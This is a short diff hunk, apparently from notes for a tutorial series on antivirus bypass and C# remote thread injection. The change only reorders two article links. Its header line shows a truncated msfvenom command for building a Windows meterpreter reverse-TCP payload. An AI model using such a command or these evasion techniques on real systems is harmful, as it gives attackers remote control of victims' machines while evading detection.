@@ -25,9 +25,9 @@ msfvenom –platform windows –arch x86_64 -p windows/x64/meterpreter/reverse_t
     
 ------------------------------------------------
 
-Article [1]: https://www.linkedin.com/pulse/bypassing-anti-virus-creating-remote-thread-target-mohammadbagher
+Article [1]: https://damonmohammadbagher.github.io/Posts/11Feb2021x.html
 
-Article [2]: https://damonmohammadbagher.github.io/Posts/11Feb2021x.html
+Article [2]: https://www.linkedin.com/pulse/bypassing-anti-virus-creating-remote-thread-target-mohammadbagher
 
 step by step => Chapter 14 : C# Delegate & Remote Thread Injection Technique (Part2)
 
